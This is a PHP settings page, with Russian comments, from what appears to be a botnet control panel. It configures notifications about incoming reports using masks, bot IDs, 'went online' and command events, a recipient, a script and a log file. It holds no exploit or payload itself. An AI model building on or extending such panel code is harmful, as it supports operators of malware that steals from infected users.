<?php if(!defined('__CP__'))die();

define('INPUT_WIDTH', '600px');
$errors = array();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Обработка данных.
///////////////////////////////////////////////////////////////////////////////////////////////////

$is_post     = strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0 ? true : false;

$jn_enabled  = (isset($_POST['enable']) && $_POST['enable'] == 1) ? 1 : ($is_post ? 0 : $config['reports_jn']);

//Проверяем получателя.
if(isset($_POST['to']))
{

if (strpos($_POST['to'], '@') === FALSE)
	  $errors[] = LNG_REPORTS_E2;

  $jn_to = $_POST['to'];
}
else $jn_to = $config['reports_jn_to'];;

//Обрабатываем маски.
$jn_masks = isset($_POST['masks']) ? $_POST['masks'] : str_replace("\x01", "\n", $config['reports_jn_list']);
$jn_masks = trim(str_replace("\r\n", "\n", $jn_masks));


$jn_botmasks = isset($_POST['botmasks']) ? $_POST['botmasks'] : str_replace("\x01", "\n", $config['reports_jn_botmasks']);
$jn_botmasks = trim(str_replace("\r\n", "\n", $jn_botmasks));


//Проверяем скрипт.
$jn_script = trim(isset($_POST['script']) ? $_POST['script'] : $config['reports_jn_script']);

//Проверяем лог-файл.
$jn_logfile = trim(str_replace('\\', '/', trim(isset($_POST['logfile']) ? $_POST['logfile'] : $config['reports_jn_logfile'])), '/');

//Сохранение параметров.
if($is_post && count($errors) == 0)
{
  $updateList['reports_jn']         = $jn_enabled ? 1 : 0;
  $updateList['reports_jn_to']      = $jn_to;
  $updateList['reports_jn_list']    = str_replace("\n", "\x01", $jn_masks);
  $updateList['reports_jn_botmasks']    = str_replace("\n", "\x01", $jn_botmasks);
  $updateList['reports_jn_script']  = $jn_script;
  $updateList['reports_jn_logfile'] = $jn_logfile;

  $updateList['reports_jn_masks'] = array(
      'wentOnline'  => preg_replace('~[\r\n]+~', "\x01", isset($_POST['reports_jn_masks']['wentOnline'])?  $_POST['reports_jn_masks']['wentOnline'] : $config['reports_jn_masks']['wentOnline']),
      'software'    => preg_replace('~[\r\n]+~', "\x01", isset($_POST['reports_jn_masks']['software'])?    $_POST['reports_jn_masks']['software'] :   $config['reports_jn_masks']['software']),
      'cmd'         => preg_replace('~[\r\n]+~', "\x01", isset($_POST['reports_jn_masks']['cmd'])?         $_POST['reports_jn_masks']['cmd'] :        $config['reports_jn_masks']['cmd']),
      'ignore_botids' => isset($_POST['reports_jn_masks']['ignore_botids'])? array_filter(array_map('trim', explode("\n", $_POST['reports_jn_masks']['ignore_botids']))): array(),
  );
  
  if(!updateConfig($updateList))$errors[] = LNG_REPORTS_E3;
  else
  {
    header('Location: '.QUERY_STRING.'&u=1');
    die();
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////////////////////////

ThemeBegin(LNG_REPORTS, 0, 0, 0);

//Вывод ошибок.
if(count($errors) > 0)
{
  echo THEME_STRING_FORM_ERROR_1_BEGIN;
  foreach($errors as $r)echo $r.THEME_STRING_NEWLINE;
  echo THEME_STRING_FORM_ERROR_1_END;
}
//Вывод сообщений.
else if(isset($_GET['u']))
{
  echo THEME_STRING_FORM_SUCCESS_1_BEGIN.LNG_REPORTS_UPDATED.THEME_STRING_NEWLINE.THEME_STRING_FORM_SUCCESS_1_END;
}

//Вывод формы.
echo
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('options', QUERY_STRING_HTML, ''), THEME_FORMPOST_BEGIN),
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_OPTIONS), THEME_DIALOG_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{TEXT}'), array(2, 'enable', 1, '', LNG_REPORTS_OPTIONS_ENABLE), $jn_enabled ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_TO, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('to', htmlEntitiesEx($jn_to), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_MASKS, THEME_DIALOG_ITEM_TEXT_TOP).
        str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('masks', 20, 100, INPUT_WIDTH, htmlEntitiesEx($jn_masks)), THEME_DIALOG_ITEM_INPUT_TEXTAREA).
      THEME_DIALOG_ROW_END.

      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_BOTMASKS, THEME_DIALOG_ITEM_TEXT_TOP).
        str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('botmasks', 20, 100, INPUT_WIDTH, htmlEntitiesEx($jn_botmasks)), THEME_DIALOG_ITEM_INPUT_TEXTAREA).
      THEME_DIALOG_ROW_END.



      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_MASKS_WENTONLINE, THEME_DIALOG_ITEM_TEXT_TOP).
        str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('reports_jn_masks[wentOnline]', 20, 100, INPUT_WIDTH, htmlEntitiesEx(strtr(@$config['reports_jn_masks']['wentOnline'], "\x01", "\n"))), THEME_DIALOG_ITEM_INPUT_TEXTAREA).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_MASKS_SOFTWARE, THEME_DIALOG_ITEM_TEXT_TOP).
        str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('reports_jn_masks[software]', 20, 100, INPUT_WIDTH, htmlEntitiesEx(strtr(@$config['reports_jn_masks']['software'], "\x01", "\n"))), THEME_DIALOG_ITEM_INPUT_TEXTAREA).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_MASKS_CMD, THEME_DIALOG_ITEM_TEXT_TOP).
        str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('reports_jn_masks[cmd]', 20, 100, INPUT_WIDTH, htmlEntitiesEx(strtr(@$config['reports_jn_masks']['cmd'], "\x01", "\n"))), THEME_DIALOG_ITEM_INPUT_TEXTAREA).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_IGNORE_BOTIDS, THEME_DIALOG_ITEM_TEXT_TOP).
        str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('reports_jn_masks[ignore_botids]', 20, 100, INPUT_WIDTH, htmlEntitiesEx(implode("\n", @$config['reports_jn_masks']['ignore_botids']?:array()))), THEME_DIALOG_ITEM_INPUT_TEXTAREA).
      THEME_DIALOG_ROW_END.


      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_SCRIPT, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('script', htmlEntitiesEx($jn_script), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_LOGFILE, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('logfile', htmlEntitiesEx($jn_logfile), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END.
  str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN).
    str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
  THEME_DIALOG_ACTIONLIST_END.
THEME_DIALOG_END.
THEME_FORMPOST_END;

ThemeEnd();
